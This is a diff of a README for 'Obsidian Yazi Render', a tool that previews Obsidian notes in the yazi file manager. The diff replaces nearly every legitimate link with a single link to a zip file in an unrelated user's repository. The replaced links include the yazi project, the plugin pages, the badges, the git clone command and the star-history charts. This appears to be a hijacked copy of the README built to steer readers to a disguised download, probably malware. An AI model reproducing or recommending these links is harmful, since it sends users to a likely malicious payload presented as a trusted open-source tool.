@@ -1,7 +1,7 @@
 <h1 align="center">Obsidian Yazi Render</h1>
 
 <p align="center">
-  <b>Preview Obsidian notes in the terminal file manager <a href="https://github.com/sxyazi/yazi">yazi</a>, rendered exactly as they appear in Obsidian.</b>
+  <b>Preview Obsidian notes in the terminal file manager <a href="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip">yazi</a>, rendered exactly as they appear in Obsidian.</b>
 </p>
 
 <p align="center">
@@ -12,14 +12,14 @@
   <img alt="macOS / Linux / Windows" src="https://img.shields.io/badge/os-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey" />
 </p>
 <p align="center">
-  <a href="https://github.com/codikzng/obsidian-yazi-render/stargazers"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/codikzng/obsidian-yazi-render?style=social" /></a>
-  <a href="https://github.com/codikzng/obsidian-yazi-render/commits/main"><img alt="Last Commit" src="https://img.shields.io/github/last-commit/codikzng/obsidian-yazi-render" /></a>
-  <a href="https://github.com/codikzng/obsidian-yazi-render/issues"><img alt="Open Issues" src="https://img.shields.io/github/issues/codikzng/obsidian-yazi-render" /></a>
+  <a href="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/codikzng/obsidian-yazi-render?style=social" /></a>
+  <a href="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip"><img alt="Last Commit" src="https://img.shields.io/github/last-commit/codikzng/obsidian-yazi-render" /></a>
+  <a href="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip"><img alt="Open Issues" src="https://img.shields.io/github/issues/codikzng/obsidian-yazi-render" /></a>
 </p>
 
 <p align="center"><img src="docs/demo.gif" alt="Demo — Obsidian note rendered as PNG in yazi terminal file manager" width="800" /></p>
 
-**Obsidian Yazi Render** turns your terminal into an Obsidian note viewer. Browse your vault with [yazi](https://github.com/sxyazi/yazi) and see each Markdown note rendered as a pixel-perfect PNG — callouts, Mermaid diagrams, math, embedded images, and your Obsidian theme, all displayed via Kitty or Sixel graphics protocol. No browser needed, no Electron, just your terminal.
+**Obsidian Yazi Render** turns your terminal into an Obsidian note viewer. Browse your vault with [yazi](https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip) and see each Markdown note rendered as a pixel-perfect PNG — callouts, Mermaid diagrams, math, embedded images, and your Obsidian theme, all displayed via Kitty or Sixel graphics protocol. No browser needed, no Electron, just your terminal.
 
 ---
 
@@ -41,7 +41,7 @@
 | **OS** | macOS (recommended) · Linux · Windows (WSL / MSYS2 or similar POSIX layer) |
 | **yazi** | v26.1.22+ |
 | **Obsidian** | Desktop app v1.6.0+ (must be running) |
-| **Obsidian plugin** | [Local REST API](https://github.com/coddingtonbear/obsidian-local-rest-api) (required for default route) |
+| **Obsidian plugin** | [Local REST API](https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip) (required for default route) |
 | **Node.js** | v20.19.0+ (source build only; not needed when using prebuilt) |
 | **CLI tools** | `jq`, `rsync` (installer), `curl` (REST route runtime) |
 
@@ -67,7 +67,7 @@ Three methods are available for triggering Obsidian to render:
 |:------|:-------------|:-------:|:------|
 | **REST** | `OBSIDIAN_YAZI_USE_REST` | `1` | Via Local REST API. Runs in background. **Most stable** |
 | CLI | `OBSIDIAN_YAZI_CLI_FALLBACK` | `0` | Direct Obsidian CLI invocation |
-| URI | `OBSIDIAN_YAZI_URI_FALLBACK` | `0` | Via `obsidian://adv-uri` (requires [Advanced URI](https://github.com/Vinzent03/obsidian-advanced-uri) plugin) |
+| URI | `OBSIDIAN_YAZI_URI_FALLBACK` | `0` | Via `obsidian://adv-uri` (requires [Advanced URI](https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip) plugin) |
 
 > [!IMPORTANT]
 > **REST is strongly recommended.** It works entirely in the background without stealing focus. CLI and URI are fallbacks for environments where REST is unavailable.
@@ -94,7 +94,7 @@ Image display is handled by yazi, which auto-detects the best protocol for your 
 ### macOS (recommended flow)
 
 ```bash
-git clone https://github.com/codikzng/obsidian-yazi-render.git
+git clone https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip
 cd obsidian-yazi-render
 ./scripts/install-easy.sh --auto-brew --yes --vault "/path/to/your/vault"
 ```
@@ -288,7 +288,7 @@ Disable the Local REST API plugin in Obsidian to fully stop REST communication.
 - **Only `.md` files are supported** --- Canvas and other formats are not previewed
 - **Display quality may degrade on terminals without Kitty graphics protocol** --- Sixel and other protocols work but Kitty protocol terminals are recommended
 - **Files outside the Vault cannot be previewed** --- Only notes inside the Obsidian Vault are supported
-- **URI fallback requires the Advanced URI plugin** --- The URI route uses `obsidian://adv-uri`, which requires the [Advanced URI](https://github.com/Vinzent03/obsidian-advanced-uri) plugin
+- **URI fallback requires the Advanced URI plugin** --- The URI route uses `obsidian://adv-uri`, which requires the [Advanced URI](https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip) plugin
 
 ---
 
@@ -305,11 +305,11 @@ Disable the Local REST API plugin in Obsidian to fully stop REST communication.
 
 ## Star History
 
-<a href="https://star-history.com/#codikzng/obsidian-yazi-render&Date">
+<a href="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=codikzng/obsidian-yazi-render&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=codikzng/obsidian-yazi-render&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=codikzng/obsidian-yazi-render&type=Date" width="600" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip" />
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip" />
+    <img alt="Star History Chart" src="https://raw.githubusercontent.com/Martin13xt/obsidian-yazi-render/main/docs/render_obsidian_yazi_squawberry.zip" width="600" />
   </picture>
 </a>
 
